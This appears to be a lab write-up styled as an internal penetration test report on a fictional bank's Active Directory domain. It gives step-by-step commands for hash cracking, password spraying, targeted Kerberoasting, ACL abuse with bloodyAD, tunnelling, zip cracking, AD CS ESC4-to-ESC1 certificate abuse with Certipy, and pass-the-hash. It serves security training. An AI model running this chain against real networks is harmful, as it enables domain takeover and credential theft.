Engagement Summary#Assumed-breach assessment against an internal financial network (404finance.local). Evaluated Active Directory security controls, internal service isolation, and certificate infrastructure misconfigurations.
Key Attack Vectors: Reverse-engineered hardcoded credentials in internal application, Active Directory ACL permission bloat (chained account takeover), and AD CS ESC4 certificate template escalation. Outcome: Achieved full Domain Administrator compromise via PKINIT certificate theft. 📄 Download / View Full Client Deliverable PDF
summary: Internal penetration test simulating an assumed-breach scenario resulting in full Active Directory domain compromise via AD CS ESC4.
title: 404 Bank: Internal Penetration Test & Domain Compromise

content:
Lab Name: 404 Bank
Difficulty: Medium
Category: Internal Penetration Test / Active Directory
1. Objective / Scope#404 Bank commissioned the Red Team to perform an internal penetration test. The objective was to assess the internal Active Directory environment starting from a standard VPN connection with zero prior knowledge or provisioned credentials.
2. Initial Enumeration#Initial reconnaissance was conducted using RustScan to rapidly identify open ports, piped into Nmap for detailed service enumeration and script scanning.
rustscan -b500 -a 10.1.253.129 -- -sC -sV -PnKey Discovered Services:
80/tcp: HTTP (Microsoft IIS 10.0) 88/tcp: Kerberos 389/tcp & 636/tcp: LDAP / LDAPS (Domain: 404finance.local) 445/tcp: SMB 3389/tcp: RDP 5985/tcp: WinRM (HTTP) Web Enumeration#Directory brute-forcing was performed on the IIS web server using Feroxbuster:
feroxbuster -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt -u http://10.1.253.129This revealed several images, an index.html, history.html, and services.html. Reviewing the web content identified three potential employee names: Karl Hackermann, Alex Meier, and Robert Graef.
3. Initial Access#The web server hosted an executable named CorpBankDialer.exe. Reverse engineering the binary using strings revealed a hardcoded debugging artifact:
DEBUG: ZGQyZWYzNDUzMGRlN2U1YmVmMjJhMDVlN2U1ZGQxNzg=\nDecoding this Base64 string yielded an MD5 hash (dd2ef34530de7e5bef22a05e7e5dd178). The hash was cracked offline using Hashcat and the rockyou.txt wordlist:
hashcat -a 0 -m 0 dd2ef34530de7e5bef22a05e7e5dd178 rockyou.txt # Result: Password123!!Using username-anarchy, a custom wordlist was generated from the scraped employee names. A password spraying attack confirmed that these credentials belonged to karl.hackermann.
4. Internal Escalation & Lateral Movement#With initial AD access, BloodHound data was collected using NetExec (nxc):
nxc ldap 10.1.253.129 -u karl.hackermann -p 'Password123!!' --bloodhound-collection all -dns-server 10.1.253.129Attack Path Discovery: BloodHound analysis revealed that karl.hackermann had GenericWrite privileges over the tom.reboot user. This privilege was abused to perform targeted Kerberoasting:
./targetedkerberoast.py -d '404finance.local' -u 'karl.hackermann' -p 'Password123!!' -dc-ip 10.1.253.129This successfully extracted the Kerberos ticket for tom.reboot. The ticket was cracked offline using Hashcat (Mode 13100), revealing the password P@ssw0rd123.
Abusing ForceChangePassword#BloodHound further indicated that tom.reboot held ForceChangePassword rights over robert.graef. This was exploited using bloodyAD:
bloodyAD --host DC-404.404finance.local -d 404finance.local -u 'tom.reboot' -p 'P@ssw0rd123' set password 'robert.graef' 'Pwned123@!'robert.graef possessed the ability to modify group memberships. This right was abused to add another user, jan.tresor, to the Remote Desktop Users group:
bloodyAD --host DC-404.404finance.local -d 404finance.local -u 'robert.graef' -p 'Pwned123@!' add groupMember 'remote desktop users' 'jan.tresor'5. Post-Exploitation & Pivoting#RDP access was established as jan.tresor. Post-exploitation enumeration of the desktop revealed a populated Recycle Bin containing credentials for daniel.hoffmann (RemoteAccess!2024).
Checking BloodHound confirmed daniel.hoffmann was a member of the Remote Management Users group, allowing lateral movement via Evil-WinRM.
evil-winrm -i DC-404.404finance.local -u daniel.hoffmann -p 'RemoteAccess!2024'Discovering the Internal Web Service#Running netstat -ano on the compromised host revealed a service listening locally on TCP port 5000 that was completely shielded from the external network.
To access this internal service, the Ligolo-ng agent was uploaded to the host via Evil-WinRM, establishing a reverse tunnel. Concurrently, daniel.hoffmann’s GenericWrite privileges were used to force a password reset on the webadmin account.
Browsing to http://127.0.0.1:5000 through the tunnel as webadmin provided access to an “Internal Admin Interface,” which hosted a config_backup.zip file.
Credential Harvesting#The downloaded ZIP archive was password-protected. A custom dictionary was generated from the target’s website using CeWL, and the archive was cracked using John the Ripper:
cewl --depth 10 --with-numbers --write cewl.txt http://404finance.local/history.html zip2john config_backup.zip > config_backup.zip.hash john --wordlist=./cewl.txt config_backup.zip.hash # Result: DontmessWithTexasExtracting the archive revealed a config.dat file containing cleartext credentials for the svc.services domain account (S3rv1cePower2024!).
6. Domain Compromise (AD CS ESC4 to ESC1)#The svc.services account was verified via NetExec but found to be disabled. robert.graef’s privileges were leveraged to re-enable the account:
bloodyAD --host DC-404.404finance.local -d 404finance.local -u robert.graef -p 'Pwned123@!' remove uac svc.services -f ACCOUNTDISABLEBloodHound and Certipy enumeration confirmed that svc.services possessed excessive control over the Vuln-ESC4 Active Directory Certificate Services (AD CS) template (ESC4 vulnerability).
The template was modified to an ESC1-exploitable state (enabling “Enrollee Supplies Subject” and adding “Client Authentication”):
certipy-ad template -u 'svc.services@404finance.local' -p 'S3rv1cePower2024!' -template Vuln-ESC4 -dc-ip 10.1.253.129 -write-default-configurationWith the template vulnerable, a certificate was requested masquerading as the Domain Administrator:
certipy-ad req -u 'svc.services@404finance.local' -p 'S3rv1cePower2024!' -template Vuln-ESC4 -ca 404finance-DC-404-CA -dc-ip 10.1.253.129 -target dc-404.404finance.local -upn administrator@404finance.localThe resulting certificate (administrator.pfx) was utilized to authenticate via PKINIT and extract the Domain Administrator’s NTLM hash:
certipy-ad auth -pfx administrator.pfx -dc-ip 10.1.253.129 # Extracted Hash: a6019e48da8f602a60c30a6f0136d792Pass-the-Hash (PtH) with Evil-WinRM granted a shell as NT AUTHORITY\SYSTEM (Administrator), achieving complete domain compromise.
7. Summary of Findings#Initial access was obtained by reverse-engineering an internal executable to extract an MD5 hash, followed by password spraying. GenericWrite privileges enabled targeted Kerberoasting for lateral movement. Chained AD delegated permissions (ForceChangePassword, group modifications) facilitated movement to standard user desktops. Insecure credential storage (Recycle Bin) and weak cryptographic archive passwords exposed a high-privileged service account. A severe AD CS misconfiguration (ESC4) allowed template modification to escalate privileges (ESC1), resulting in full Domain Admin compromise.
